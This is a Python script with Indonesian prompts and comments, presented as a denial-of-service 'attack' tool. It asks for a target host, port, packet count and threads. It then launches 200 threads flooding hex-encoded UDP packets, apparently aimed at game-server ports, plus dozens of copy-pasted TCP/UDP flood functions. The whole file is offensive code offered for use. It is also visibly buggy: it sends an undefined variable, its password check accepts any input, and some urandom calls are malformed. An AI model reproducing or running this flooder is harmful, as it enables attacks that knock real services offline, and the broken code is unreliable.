import random
import threading
import codecs
import struct
import time
import socket
import sys
import os
import os,sys
from datetime import datetime
import scapy.all as scapy

#Warna Untuk Tools
yellow='\033[93m'
gren='\033[92m'
cyan='\033[96m'
pink='\033[95m'
red='\033[91m'
b='\033[1m'

#Waktu
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

os.system("clear")
password ="TERMINATOR"

for i in range(3):
	password = input(yellow+b+"[Σ] Masukan Password Tools : "+b+yellow)
	Σ=3
	if(password==password):
		time.sleep(5)
		print(pink+b+"[Σ] Passwod Yang Kamu Masukan Benar Tunggu 5 Detik!!!"+b+pink)
		break
	else:
		time.sleep(5)
		print(red+b+"\033[91m[Σ] Kamu Salah Memasukan Password!!! "+b+red)
		continue
time.sleep(5)
print(gren+b+"[Σ] Login Succesfull \033[92m√"+b+gren)
os.system("clear")

print(i +"\033[1;31;40m")
print(i +"""
▀█▀ █▀▀ █▀█ █▀▄▀█ █ █▄░█ ▄▀█ ▀█▀ █▀█ █▀█
░█░ ██▄ █▀▄ █░▀░█ █ █░▀█ █▀█ ░█░ █▄█ █▀▄""")
print(i +"\033[1;36;40m====>>>{METHODS (+ Attack +)}<<====")
print(i +"\033[1;36;40m====>>>{ Author: ΣXLIPSΣ }<<<====")
print(i +"\033[1;36;40m====>>>{ + Create My Tools 2022 + }<<<====")
ip = str(input(i +"\033[1;36;40mEnter Send Attack Host : \033[1;31;40m"))
port = int(input(i +"\033[1;36;40mEnter Send Attack Port : \033[1;31;40m"))
choice = str(input(i +"\033[1;36;40mEnter Send Methods ( + Attack + ) : \033[1;31;40m"))
times = int(input(i +"\033[1;36;40mEnter Send Attack Packet : \033[1;31;40m"))
threads = int(input(i +"\033[1;36;40mEnter Send Attack Threads : \033[1;31;40m"))

os.system("clear")
os.system("figlet Attack Starting")
print(cyan+b+"\033[1;91m[ xxx>                   ] 0%"+b+cyan)
time.sleep(5)
print("[<<=======>>            ] 25%")
time.sleep(5)
print("[<<==========>>        ] 50%")
time.sleep(5)
print("[<<============>>     ] 75%")
time.sleep(5)
print(cyan+b+"[<<===============>>] 100%"+b+cyan)
time.sleep(3)
os.system("clear")
fake_ip = '182.21.20.32'
fake_ip = '144.76.38.22'
fake_ip = '113.218.77.15'
fake_ip = '128.111.31.1'
#Starting Attacking
Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784 ]
                       
def Attack():
	bytes = random._urandom(577)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\u001b[31m ADA YANG Attack IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
		except:
			print("\u001b[31m[×] ADA YANG Attack IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))


def Attack2():
	bytes = random._urandom(577)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m ADA YANG Attack IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("\u001b[31m[×] ADA YANG Attack IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))


def Attack3():
	bytes = random._urandom(577)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m ADA YANG Attack IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("\u001b[31m[×] ADA YANG Attack IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))


def Attack4():
	bytes = random._urandom(577)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m GRATER ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))


def Attack5():
	bytes = random._urandom(577)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))
		except:
			s.close()
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))


def Attack6():
	bytes = random._urandom(1460)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))
		except:
			s.close()
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))


def Attack7():
	bytes = random._urandom(999)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))
		except:
			s.close()
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))


def Attack8():
	bytes = random._urandom(818)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))
		except:
			s.close()
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))
    
   
def Attack9():
	bytes = random._urandom(17)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))
		except:
			s.close()
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))


def Attack10():
	bytes = random._urandom(696969)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))
		except:
			s.close()
			(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))
         
         
def Attack11():
	bytes = random._urandom(20000)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))
		except:
			print("KOK DOWN A")
         
         
def Attack12():
	bytes = random._urandom(577)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m ADA YANG Attack IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("[*] Server Down")

         
def Attack13():
	bytes = random._urandom(577)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"Attack BY GRTR")
		except:
			s.close()
			print("[*] Server Down")
			
			
def Attack14():
	bytes = random._urandom(577)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\u001b[31m ADA YANG Attack IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
		except:
			print("\u001b[31m[×] ADA YANG Attack IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))


def Attack15():
	bytes = random._urandom(577)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m ADA YANG Attack IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("\u001b[31m[×] ADA YANG Attack IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))


def Attack16():
	bytes = random._urandom(577)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m ADA YANG Attack IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("\u001b[31m[×] ADA YANG Attack IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))


def Attack17():
	bytes = random._urandom(577)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m GRATER ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))


def Attack18():
	bytes = random._urandom(577)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))
		except:
			s.close()
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))


def Attack19():
	bytes = random._urandom(1460)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))
		except:
			s.close()
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))


def Attack20():
	bytes = random._urandom(999)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))
		except:
			s.close()
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))


def Attack21():
	bytes = random._urandom(818)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))
		except:
			s.close()
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))
    
   
def Attack22():
	bytes = random._urandom(17)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))
		except:
			s.close()
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))


def Attack23():
	bytes = random._urandom(577)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\u001b[31m ADA YANG Attack IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
		except:
			print("\u001b[31m[×] ADA YANG Attack IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))


def Attack24():
	bytes = random._urandom(577)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m ADA YANG Attack IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("\u001b[31m[×] ADA YANG Attack IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))


def Attack25():
	bytes = random._urandom(577)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m ADA YANG Attack IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("\u001b[31m[×] ADA YANG Attack IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))


def Attack26():
	bytes = random._urandom(577)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m GRATER ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))


def Attack27():
	bytes = random._urandom(577)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))
		except:
			s.close()
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))


def Attack28():
	bytes = random._urandom(1460)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))
		except:
			s.close()
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))


def Attack29():
	bytes = random._urandom(999)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))
		except:
			s.close()
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))


def Attack30():
	bytes = random._urandom(818)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))
		except:
			s.close()
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))
    
   
def Attack31():
	bytes = random._urandom(17)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))
		except:
			s.close()
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))


def Attack32():
	bytes = random._urandom(696969)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))
		except:
			s.close()
			(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))
         
         
def Attack33():
	bytes = random._urandom(20000)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))
		except:
			print("KOK DOWN A")
         
         
def Attack34():
	bytes = random._urandom(577)
	pack = random._urandom(577)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m ADA YANG Attack IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("[*] Server Down")

         
def Attack35():
	bytes = random._urandom(577)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"Attack BY GRTR")
		except:
			s.close()
			print("[*] Server Down")
			
			
def Attack36():
	bytes = random._urandom(577)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\u001b[31m ADA YANG Attack IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
		except:
			print("\u001b[31m[×] ADA YANG Attack IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))


def Attack37():
	bytes = random._urandom(577)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m ADA YANG Attack IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("\u001b[31m[×] ADA YANG Attack IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))


def Attack38():
	bytes = random._urandom(577)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m ADA YANG Attack IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("\u001b[31m[×] ADA YANG Attack IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))


def Attack39():
	bytes = random._urandom(577)
	pack = random._urandom(577)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m GRATER ATTACK TO IP:\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
		except:
			s.close()
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))


def Attack40():
	bytes = random._urandom(577)
	pack = random._urandom(577)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))
		except:
			s.close()
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))


def Attack41():
	bytes = random._urandom(620)
	pack = random._urandom(620)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))
		except:
			s.close()
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))


def Attack42():
	bytes = random._urandom(622)
	pack = random._urandom(622)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))
		except:
			s.close()
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))


def Attack43():
	bytes = random._urandom(617)
	pack = random._urandom(617)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))
		except:
			s.close()
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))
    
   
def Attack44():
	bytes = random._urandom(17)
	pack = random._urandom(17)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))
		except:
			s.close()
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))


def Attack45():
	bytes = random._urandom(10240)
	pack = random._urandom(10240)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))
		except:
			s.close()
			(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))
         
     
def Attack46():
	bytes = random._urandom(4096,65534)
	pack = random._urandom(4096,65534)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))
		except:
			s.close()
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))


def Attack47():
	bytes = random._urandom(581)
	pack = random._urandom(581)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))
		except:
			s.close()
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))


def Attack48():
	bytes = random._urandom(579)
	pack = random._urandom(579)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))
		except:
			s.close()
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))
    
   
def Attack49():
	bytes = random._urandom(17)
	pack = urandom._random(17)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))
		except:
			s.close()
			print(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))


def Attack50():
	bytes = random._urandom(200000)
	pack = random._urandom(200000)
	i = random.choice(("[Σ]","[Σ]","[Σ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))
		except:
			s.close()
			(i +"\033[91m Send Attack Host\033[0m%s\033[91m And Attack Port:\033[0m%s"%(ip,port))

#Urandom Dan Pacotes
class MyThread(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM)
                
                msg = Pacotes[random.randrange(0,5)]
                     
                sock.sendto(msg, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                    
                

if __name__ == '__main__':
    try:
     for x in range(200):                                    
            mythread = MyThread()  
            mythread.start()                                  
            time.sleep(.1)    
    except(KeyboardInterrupt):
         os.system('cls' if os.name == 'nt' else 'clear')
       
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = Attack)
		th.start()
		th = threading.Thread(target = Attack2)
		th.start()
		th = threading.Thread(target = Attack3)
		th.start()
		th = threading.Thread(target = Attack4)
		th.start()
		th = threading.Thread(target = Attack5)
		th.start()
		th = threading.Thread(target = Attack6)
		th.start()
		th = threading.Thread(target = Attack7)
		th.start()
		th = threading.Thread(target = Attack8)
		th.start()
		th = threading.Thread(target = Attack9)
		th.start()
		th = threading.Thread(target = Attack10)
		th.start()
		th = threading.Thread(target = Attack11)
		th.start()
		th = threading.Thread(target = Attack13)
		th.start()
		th = threading.Thread(target = Attack14)
		th.start()
		th = threading.Thread(target = Attack15)
		th.start()
		th = threading.Thread(target = Attack16)
		th.start()
		th = threading.Thread(target = Attack17)
		th.start()
		th = threading.Thread(target = Attack18)
		th.start()
		th = threading.Thread(target = Attack19)
		th.start()
		th = threading.Thread(target = Attack20)
		th.start()
		th = threading.Thread(target = Attack21)
		th.start()
		th = threading.Thread(target = Attack22)
		th.start()
		th = threading.Thread(target = Attack23)
		th.start()
		th = threading.Thread(target = Attack24)
		th.start()
		th = threading.Thread(target = Attack25)
		th.start()
		th = threading.Thread(target = Attack26)
		th.start()
		th = threading.Thread(target = Attack27)
		th.start()
		th = threading.Thread(target = Attack28)
		th.start()
		th = threading.Thread(target = Attack29)
		th.start()
		th = threading.Thread(target = Attack30)
		th.start()
		th = threading.Thread(target = Attack31)
		th.start()
		th = threading.Thread(target = Attack32)
		th.start()
		th = threading.Thread(target = Attack33)
		th.start()
		th = threading.Thread(target = Attack34)
		th.start()
		th = threading.Thread(target = Attack35)
		th.start()
		th = threading.Thread(target = Attack36)
		th.start()
		th = threading.Thread(target = Attack37)
		th.start()
		th = threading.Thread(target = Attack38)
		th.start()
		th = threading.Thread(target = Attack39)
		th.start()
		th = threading.Thread(target = Attack40)
		th.start()
		th = threading.Thread(target = Attack41)
		th.start()
		th = threading.Thread(target = Attack42)
		th.start()
